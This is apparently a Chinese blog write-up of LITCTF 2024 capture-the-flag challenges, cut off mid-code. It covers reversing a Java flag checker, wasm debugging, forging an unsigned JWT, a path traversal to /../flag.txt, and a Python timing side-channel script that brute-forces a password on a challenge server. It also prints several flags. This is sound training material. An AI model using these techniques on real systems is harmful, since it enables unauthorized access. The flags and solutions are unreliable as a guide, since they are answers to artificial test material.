<li>漏洞介绍wiki <a href="https://en.wikipedia.org/wiki/ACropalypse">https://en.wikipedia.org/wiki/ACropalypse</a></li>
<li>漏洞利用工具 <a href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool">https://github.com/frankthetank-music/Acropalypse-Multi-Tool</a></li>
</ul>
<p>修复结果：</p>
<img src="/2024/08/12/LITCTF-2024/image_.png" class="">

<h3 id="pokemon"><a href="#pokemon" class="headerlink" title="pokemon"></a>pokemon</h3><p>旗语 <a href="https://en.wikipedia.org/wiki/Flag_semaphore">Flag semaphore</a></p>
<img src="/2024/08/12/LITCTF-2024/p.png" class="">
<img src="/2024/08/12/LITCTF-2024/flag.png" class="">
<p><code>LITCTF&#123;POKEAAAG&#125;</code></p>
<h3 id="endless"><a href="#endless" class="headerlink" title="endless"></a>endless</h3><blockquote>
<p>Whoops! I deleted the file ending of this file, and now I can’t seem to figure out what type of file it was. Can you help me?</p>
</blockquote>
<p>本来这道题应该是让我们修复🔧mp3文件头，但是现在的播放器以及很强大了，直接省去了这一步😂</p>
<h2 id="Rev-逆向"><a href="#Rev-逆向" class="headerlink" title="Rev - 逆向"></a>Rev - 逆向</h2><h3 id="forgotten-message"><a href="#forgotten-message" class="headerlink" title="forgotten message"></a>forgotten message</h3><blockquote>
<p>I made a cool program to show the flag, but i forgot to output it! Now that I lost the source, I can’t seem to remember the flag. Can you help me find it?</p>
</blockquote>
<p>入门逆向题，丢到ida就能看到flag。</p>
<img src="/2024/08/12/LITCTF-2024/rev.png" class="">


<h3 id="kablewy"><a href="#kablewy" class="headerlink" title="kablewy"></a>kablewy</h3><blockquote>
<p>halp WARNING: your computer might go kablewy if you try to do this one…<br>JavaScript逆向？其实就是base64加密了一下。😂</p>
</blockquote>
<h3 id="Burger-Reviewer"><a href="#Burger-Reviewer" class="headerlink" title="Burger Reviewer"></a>Burger Reviewer</h3><blockquote>
<p>Try to sneak a pizza into the burger reviewer!</p>
</blockquote>
<p>原题附件： <a href="/2024/08/12/LITCTF-2024/Burgers.java" title="Burgers.java">Burgers.java</a></p>
<p>一共五个部分</p>
<ul>
<li><p>第一部分🍞限制了开头和结尾的字符<code>LITCTF&#123;</code>和<code>&#125;</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">bun</span><span class="hljs-params">(String s)</span> &#123;<br>    <span class="hljs-keyword">return</span> (s.substring(<span class="hljs-number">0</span>, <span class="hljs-number">7</span>).equals(<span class="hljs-string">&quot;LITCTF&#123;&quot;</span>) &amp;&amp; s.charAt(s.length()-<span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;&#125;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><code class="hljs py">s = [<span class="hljs-string">&quot;#&quot;</span>] * <span class="hljs-number">42</span><br>s[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;L&quot;</span><br>s[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;I&quot;</span><br>s[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;T&quot;</span><br>s[<span class="hljs-number">3</span>] = <span class="hljs-string">&quot;C&quot;</span><br>s[<span class="hljs-number">4</span>] = <span class="hljs-string">&quot;T&quot;</span><br>s[<span class="hljs-number">5</span>] = <span class="hljs-string">&quot;F&quot;</span><br>s[<span class="hljs-number">6</span>] = <span class="hljs-string">&quot;&#123;&quot;</span><br>s[-<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;&#125;&quot;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>第二部分🧀给出了下划线字符的位置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">cheese</span><span class="hljs-params">(String s)</span> &#123;<br>    <span class="hljs-keyword">return</span> (s.charAt(<span class="hljs-number">13</span>) == <span class="hljs-string">&#x27;_&#x27;</span> &amp;&amp; (<span class="hljs-type">int</span>)s.charAt(<span class="hljs-number">17</span>) == <span class="hljs-number">95</span> &amp;&amp; s.charAt(<span class="hljs-number">19</span>) == <span class="hljs-string">&#x27;_&#x27;</span> &amp;&amp; s.charAt(<span class="hljs-number">26</span>)+s.charAt(<span class="hljs-number">19</span>) == <span class="hljs-number">190</span> &amp;&amp; s.charAt(<span class="hljs-number">29</span>) == <span class="hljs-string">&#x27;_&#x27;</span> &amp;&amp; s.charAt(<span class="hljs-number">34</span>)-<span class="hljs-number">5</span> == <span class="hljs-number">90</span> &amp;&amp; s.charAt(<span class="hljs-number">39</span>) == <span class="hljs-string">&#x27;_&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><code class="hljs py">s[<span class="hljs-number">13</span>] = <span class="hljs-string">&quot;_&quot;</span><br>s[<span class="hljs-number">17</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)<br>s[<span class="hljs-number">19</span>] = <span class="hljs-string">&quot;_&quot;</span><br>s[<span class="hljs-number">26</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-number">190</span> - <span class="hljs-built_in">ord</span>(s[<span class="hljs-number">19</span>]))<br>s[<span class="hljs-number">29</span>] = <span class="hljs-string">&quot;_&quot;</span><br>s[<span class="hljs-number">34</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-number">90</span> + <span class="hljs-number">5</span>)<br>s[<span class="hljs-number">39</span>] = <span class="hljs-string">&quot;_&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(s))<br><span class="hljs-comment"># LITCTF&#123;######_###_#_######_##_####_####_#&#125;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>第三部分🥩</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">meat</span><span class="hljs-params">(String s)</span> &#123;<br>  <span class="hljs-type">boolean</span> <span class="hljs-variable">good</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>  <span class="hljs-type">int</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> <span class="hljs-number">41</span>;<br>  <span class="hljs-type">char</span>[] meat = &#123;<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>&#125;;<br>  <span class="hljs-type">int</span>[] dif = &#123;<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>&#125;;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; meat.length; i++) &#123;<br>    m -= dif[i];<br>    <span class="hljs-keyword">if</span> (s.charAt(m) != meat[i]) &#123;<br>      good = <span class="hljs-literal">false</span>;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> good;<br>&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><code class="hljs py">m = <span class="hljs-number">41</span><br>meat = [<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>]<br>dif = [<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(meat)):<br>    m -= dif[i]<br>    s[m] = meat[i]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(s))<br><span class="hljs-comment"># LITCTF&#123;######_###_#_#i##a#_if_th#y_w#n#_#&#125;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>第四部分🧂</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">pizzaSauce</span><span class="hljs-params">(String s)</span> &#123;<br>  <span class="hljs-type">boolean</span>[] isDigit = &#123;<span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>&#125;;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">7</span>; i &lt; <span class="hljs-number">21</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (Character.isDigit(s.charAt(i)) != isDigit[i - <span class="hljs-number">7</span>]) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-type">char</span>[] sauce = &#123;<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>&#125;;<br>  <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">7</span>; <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>; <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-type">boolean</span> <span class="hljs-variable">good</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>  <span class="hljs-keyword">while</span> (a &lt; b) &#123;<br>    <span class="hljs-keyword">if</span> (s.charAt(a) != sauce[i] || s.charAt(b) != sauce[i+<span class="hljs-number">1</span>]) &#123;<br>      good = <span class="hljs-literal">false</span>;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>    a++; b--; i += <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">while</span> (!Character.isLetter(s.charAt(a))) a++;<br>    <span class="hljs-keyword">while</span> (!Character.isLetter(s.charAt(b))) b--;<br>  &#125;<br>  <span class="hljs-keyword">return</span> good;<br>&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><code class="hljs py">isDigit = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>, <span class="hljs-number">21</span>):<br>    <span class="hljs-keyword">if</span> isDigit[i - <span class="hljs-number">7</span>] == <span class="hljs-number">1</span>:<br>        s[i] = <span class="hljs-built_in">str</span>(isDigit[i - <span class="hljs-number">7</span>])<br>sauce = [<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>]<br>a = <span class="hljs-number">7</span><br>b = <span class="hljs-number">20</span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> a &lt; b:<br>    s[a] = sauce[i]<br>    s[b] = sauce[i + <span class="hljs-number">1</span>]<br>    a += <span class="hljs-number">1</span><br>    b -= <span class="hljs-number">1</span><br>    i += <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> s[a] != <span class="hljs-string">&quot;#&quot;</span>:<br>        a += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> s[b] != <span class="hljs-string">&quot;#&quot;</span>:<br>        b -= <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(s))<br><span class="hljs-comment"># LITCTF&#123;bur1r1_c1n_b_pi##a#_if_th#y_w#n#_#&#125;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>第五部分🥬</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">veggies</span><span class="hljs-params">(String s)</span> &#123;<br>  <span class="hljs-type">int</span>[] veg1 = &#123;<span class="hljs-number">10</span>, <span class="hljs-number">12</span>, <span class="hljs-number">15</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">25</span>, <span class="hljs-number">32</span>, <span class="hljs-number">36</span>, <span class="hljs-number">38</span>, <span class="hljs-number">40</span>&#125;;<br>  <span class="hljs-type">int</span>[] veg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; veg1.length; i++) &#123;<br>    veg[i] = Integer.parseInt(s.substring(veg1[i], veg1[i]+<span class="hljs-number">1</span>));<br>  &#125;<br>  <span class="hljs-keyword">return</span> (veg[<span class="hljs-number">0</span>] + veg[<span class="hljs-number">1</span>] == <span class="hljs-number">14</span> &amp;&amp; veg[<span class="hljs-number">1</span>] * veg[<span class="hljs-number">2</span>] == <span class="hljs-number">20</span> &amp;&amp; veg[<span class="hljs-number">2</span>]/veg[<span class="hljs-number">3</span>]/veg[<span class="hljs-number">4</span>] == <span class="hljs-number">1</span> &amp;&amp; veg[<span class="hljs-number">3</span>] == veg[<span class="hljs-number">4</span>] &amp;&amp; veg[<span class="hljs-number">3</span>] == <span class="hljs-number">2</span> &amp;&amp; veg[<span class="hljs-number">4</span>] - veg[<span class="hljs-number">5</span>] == -<span class="hljs-number">3</span> &amp;&amp; Math.pow(veg[<span class="hljs-number">5</span>], veg[<span class="hljs-number">6</span>]) == <span class="hljs-number">125</span> &amp;&amp; veg[<span class="hljs-number">7</span>] == <span class="hljs-number">4</span> &amp;&amp; veg[<span class="hljs-number">8</span>] % veg[<span class="hljs-number">7</span>] == <span class="hljs-number">3</span> &amp;&amp; veg[<span class="hljs-number">8</span>] + veg[<span class="hljs-number">9</span>] == <span class="hljs-number">9</span> &amp;&amp; veg[veg.length - <span class="hljs-number">1</span>] == <span class="hljs-number">2</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><code class="hljs py">veg = [<span class="hljs-number">10</span>, <span class="hljs-number">12</span>, <span class="hljs-number">15</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">25</span>, <span class="hljs-number">32</span>, <span class="hljs-number">36</span>, <span class="hljs-number">38</span>, <span class="hljs-number">40</span>]<br>s[veg[<span class="hljs-number">0</span>]] = <span class="hljs-string">&quot;9&quot;</span><br>s[veg[<span class="hljs-number">1</span>]] = <span class="hljs-string">&quot;5&quot;</span><br>s[veg[<span class="hljs-number">2</span>]] = <span class="hljs-string">&quot;4&quot;</span><br>s[veg[<span class="hljs-number">3</span>]] = <span class="hljs-string">&quot;2&quot;</span><br>s[veg[<span class="hljs-number">4</span>]] = <span class="hljs-string">&quot;2&quot;</span><br>s[veg[<span class="hljs-number">5</span>]] = <span class="hljs-string">&quot;5&quot;</span><br>s[veg[<span class="hljs-number">6</span>]] = <span class="hljs-string">&quot;3&quot;</span><br>s[veg[<span class="hljs-number">7</span>]] = <span class="hljs-string">&quot;4&quot;</span><br>s[veg[<span class="hljs-number">8</span>]] = <span class="hljs-string">&quot;7&quot;</span><br>s[veg[<span class="hljs-number">9</span>]] = <span class="hljs-string">&quot;2&quot;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(s))<br><span class="hljs-comment"># LITCTF&#123;bur9r5_c4n_b_pi22a5_if_th3y_w4n7_2&#125;</span><br></code></pre></td></tr></table></figure></li>
</ul>
<h3 id="revsite1"><a href="#revsite1" class="headerlink" title="revsite1"></a>revsite1</h3><p>wasm逆向</p>
<p>这题由于代码太长，我们采用动态调试的方法。</p>
<img src="/2024/08/12/LITCTF-2024/rev1.png" class="">
<p>首先找到flag检查的相关函数。</p>
<img src="/2024/08/12/LITCTF-2024/rev2.png" class="">
<p>按钮事件。</p>
<img src="/2024/08/12/LITCTF-2024/rev3.png" class="">
<p>对应函数，调用了wasm中的<code>check_flag</code>函数。</p>
<img src="/2024/08/12/LITCTF-2024/rev4.png" class="">
<p>来到对应函数，一路往下翻，看到了一个<code>$strcmp</code>，狂喜。</p>
<img src="/2024/08/12/LITCTF-2024/rev5.png" class="">
<img src="/2024/08/12/LITCTF-2024/rev6.png" class="">
<p>在<code>strcmp</code>函数内打下断点，查看相关变量，经测试得到<code>$var3</code>是对应的flag字符。</p>
<img src="/2024/08/12/LITCTF-2024/rev7.png" class="">
<p>往下找到了<code>loop</code>结构，估计就是循环遍历字符来比较了。</p>
<img src="/2024/08/12/LITCTF-2024/rev8.png" class="">
<p>在此处设置一个日志点，捕获下一个flag字符。</p>
<img src="/2024/08/12/LITCTF-2024/rev9.png" class="">
<p>最后，循环输入新蹦出的字符并再次检查即可拼接出完整的flag。</p>
<h2 id="Web-网站"><a href="#Web-网站" class="headerlink" title="Web - 网站"></a>Web - 网站</h2><h3 id="anti-inspect"><a href="#anti-inspect" class="headerlink" title="anti-inspect"></a>anti-inspect</h3><blockquote>
<p>can you find the answer? WARNING: do not open the link your computer will not enjoy it much.</p>
</blockquote>
<img src="/2024/08/12/LITCTF-2024/anti.png" class="">

<h3 id="jwt-1"><a href="#jwt-1" class="headerlink" title="jwt-1"></a>jwt-1</h3><blockquote>
<p>I just made a website. Since cookies seem to be a thing of the old days, I updated my authentication! With these modern web technologies, I will never have to deal with sessions again.<br>没有签名校验的jwt，使用<a href="https://jwt.io/">jwt.io</a>修改身份即可。😋</p>
</blockquote>
<h3 id="jwt-2"><a href="#jwt-2" class="headerlink" title="jwt-2"></a>jwt-2</h3><blockquote>
<p>its like jwt-1 but this one is harder<br>源码泄露，给了对应的key。😋</p>
</blockquote>
<h3 id="traversed"><a href="#traversed" class="headerlink" title="traversed"></a>traversed</h3><blockquote>
<p>I made this website! you can’t see anything else though… right??</p>
</blockquote>
<p>拿<code>dirsearch</code>扫了一下，发现有目录穿越漏洞。😋<br>flag在 <code>/../flag.txt</code></p>
<h3 id="kirbytime"><a href="#kirbytime" class="headerlink" title="kirbytime"></a>kirbytime</h3><blockquote>
<p>Welcome to Kirby’s Website.<br>附件: <a href="/2024/08/12/LITCTF-2024/kirbytime.zip" title="kirbytime.zip">kirbytime.zip</a><br>审查了一下代码，发现有人为设置的侧信道攻击点。😋</p>
</blockquote>
<img src="/2024/08/12/LITCTF-2024/kk.png" class="">
<p>祭出万能的python</p>
<figure class="highlight py"><table><tr><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_request_time</span>(<span class="hljs-params">passwd, session</span>):<br>    url = <span class="hljs-string">&quot;http://34.31.154.223:50165/&quot;</span><br><br>    payload = <span class="hljs-string">f&quot;password=<span class="hljs-subst">&#123;passwd&#125;</span>&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0&quot;</span>,<br>    &#125;<br><br>    response = session.request(<span class="hljs-string">&quot;POST&quot;</span>, url, headers=headers, data=payload)<br>    <span class="hljs-keyword">return</span> response.elapsed.total_seconds()<br><br><br>session = requests.Session()<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string.ascii_letters + string.digits + <span class="hljs-string">&quot;_&quot;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Testing <span class="hljs-subst">&#123;i&#125;</span>&quot;</span>, get_request_time( i + <span class="hljs-string">&quot;123456&quot;</span>, session))<br></code></pre></td></tr></table></figure>
<p>如果密码正确，就会延时一秒，人眼判断一下异常的时间，最后得到密码 <code>kBySlaY</code></p>
<h3 id="scrainbow"><a href="#scrainbow" class="headerlink" title="scrainbow"></a>scrainbow</h3><blockquote>
<p>Oh no! someone dropped my perfect gradient and it shattered into 10000 pieces! I can’t figure out how to put it back together anymore, it never looks quite right. Can you help me fix it?<br>压轴出现！这道题应该是这个比赛中我做出最麻烦的一道题了。🧐</p>
</blockquote>
<img src="/2024/08/12/LITCTF-2024/rainbow1.png" class="">
<p>题目给了一个<code>100*100</code>的颜色矩阵，定义了一种操作<code>交换</code>，既交换两个颜色色块，交换的操作表示为 <code>[ FromPos, ToPos ]</code>。要求给出操作列表，使得这个颜色矩阵变成<code>从左上角到右下角为 红色-彩色-红色</code>。</p>
<p><del>吐槽一下，这道题怎么给我一种在隔壁做算法题的感觉……</del>😕</p>
<p>附上几张图：</p>
<table>
<thead>
<tr>
<th align="center">数据来源</th>
<th align="center">最终的图片</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><img src="/2024/08/12/LITCTF-2024/rainbow3.png" class=""></td>
<td align="center"><img src="/2024/08/12/LITCTF-2024/output.png" class=""></td>
</tr>
</tbody></table>
<p>思路如下：</p>
<ol>
<li><p><strong>获取数据集</strong>：</p>
<ul>
<li>使用 <code>requests.get</code> 方法从指定 URL 获取颜色数据集，并将其解析为 JSON 格式的列表。</li>
</ul>
</li>
<li><p><strong>颜色转换和距离计算</strong>：</p>
<ul>
<li>定义了一个函数 <code>hex_to_rgb</code>，用于将十六进制颜色代码转换为 RGB 元组。</li>
<li>定义了另一个函数 <code>calc_distance</code>，用于计算两个 RGB 颜色之间的欧几里得距离。</li>
</ul>
</li>
<li><p><strong>统计颜色出现次数并排序</strong>：</p>
<ul>
<li>使用一个字典 <code>color_dict</code> 来统计每种颜色在数据集中出现的次数。</li>
<li>将字典按颜色出现次数进行排序，得到一个列表 <code>color_dict</code>。</li>
</ul>
</li>
<li><p><strong>生成期望的颜色排序</strong>：</p>
<ul>
<li>初始化一个 <code>expect_color</code> 列表，用于存储期望的颜色排序。</li>
<li>选择出现次数第二多的颜色作为起始颜色，并将其添加到 <code>expect_color</code> 列表中。</li>
<li>复制并删除已选择的颜色，避免重复使用。</li>
<li>通过计算当前颜色与其他颜色之间的距离，选择距离最近的颜色依次添加到 <code>expect_color</code> 列表中。</li>
<li>逆序添加剩余的颜色到 <code>expect_color</code> 列表中，确保所有颜色都被包含。</li>
</ul>
</li>
<li><p><strong>生成目标列表</strong>：</p>
<ul>
<li>初始化一个 <code>target_list</code> 列表，用于存储最终的目标颜色排列。</li>
<li>按照一定的规则（例如每次移动一个位置）将 <code>expect_color</code> 列表中的颜色添加到 <code>target_list</code> 列表中。</li>
</ul>
</li>
<li><p><strong>生成交换操作列表</strong>：</p>
<ul>
<li>定义一个函数 <code>find_swap_operations</code>，用于生成将原始颜色列表转换为目标颜色列表所需的交换操作。</li>
<li>通过遍历原始列表和目标列表，找到需要交换的位置，并记录交换操作。</li>
</ul>
</li>
<li><p><strong>提交交换操作列表</strong>：</p>
<ul>
<li>使用 <code>requests.post</code> 方法将生成的交换操作列表提交到指定的服务器 URL。</li>
<li>打印服务器返回的响应，确认操作是否成功。</li>
</ul>
</li>
</ol>

    <div class="fold">
      <div class="fold-title fold-default collapsed" data-toggle="collapse" href="#collapse-42d133e0" role="button" aria-expanded="false" aria-controls="collapse-42d133e0">
        <div class="fold-arrow">▶</div>解题代码.py
      </div>
      <div class="fold-collapse collapse" id="collapse-42d133e0">
        <div class="fold-content">
          <figure class="highlight py"><table><tr><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment"># 第一步，获取数据集</span><br>color_data = requests.get(<span class="hljs-string">&quot;http://litctf.org:31780/data&quot;</span>).json()<br><br><span class="hljs-comment"># 第二步，找到正确的排序顺序</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hex_to_rgb</span>(<span class="hljs-params"><span class="hljs-built_in">hex</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">tuple</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">hex</span>[i : i + <span class="hljs-number">2</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> (<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_distance</span>(<span class="hljs-params">color1, color2</span>):<br>    r1, g1, b1 = hex_to_rgb(color1)<br>    r2, g2, b2 = hex_to_rgb(color2)<br>    <span class="hljs-keyword">return</span> (r1 - r2) ** <span class="hljs-number">2</span> + (g1 - g2) ** <span class="hljs-number">2</span> + (b1 - b2) ** <span class="hljs-number">2</span><br><br><span class="hljs-comment"># 创建哈希表，存储颜色及其对应出现次数</span><br>color_dict = &#123;&#125;<br><span class="hljs-keyword">for</span> color <span class="hljs-keyword">in</span> color_data:<br>    <span class="hljs-keyword">if</span> color <span class="hljs-keyword">in</span> color_dict:<br>        color_dict[color] += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        color_dict[color] = <span class="hljs-number">1</span><br><br><span class="hljs-comment"># 按照颜色出现次数排序</span><br>color_dict = <span class="hljs-built_in">sorted</span>(color_dict.items(), key=<span class="hljs-keyword">lambda</span> x: (x[<span class="hljs-number">1</span>]))<br><br>expect_color = []<br>expect_color.append(color_dict[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>])<br>current = color_dict[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>][<span class="hljs-number">1</span>:]<br><br>color_dict_bak = color_dict.copy()<br>color_dict_bak.remove(color_dict[<span class="hljs-number">1</span>])<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-built_in">len</span>(color_dict) - <span class="hljs-number">1</span>, <span class="hljs-number">2</span>):<br>    color1 = calc_distance(color_dict[i][<span class="hljs-number">0</span>][<span class="hljs-number">1</span>:], current)<br>    color2 = calc_distance(color_dict[i + <span class="hljs-number">1</span>][<span class="hljs-number">0</span>][<span class="hljs-number">1</span>:], current)<br>    <span class="hljs-keyword">if</span> color1 &lt; color2:<br>        expect_color.append(color_dict[i][<span class="hljs-number">0</span>])<br>        current = color_dict[i][<span class="hljs-number">0</span>][<span class="hljs-number">1</span>:]<br>        color_dict_bak.remove(color_dict[i])<br>    <span class="hljs-keyword">else</span>:<br>        expect_color.append(color_dict[i + <span class="hljs-number">1</span>][<span class="hljs-number">0</span>])<br>        current = color_dict[i + <span class="hljs-number">1</span>][<span class="hljs-number">0</span>][<span class="hljs-number">1</span>:]<br>        color_dict_bak.remove(color_dict[i + <span class="hljs-number">1</span>])<br><span class="hljs-comment"># 逆序添加剩余的颜色</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(color_dict_bak) - <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>    expect_color.append(color_dict_bak[i][<span class="hljs-number">0</span>])<br><br>target_list = []<br>l = <span 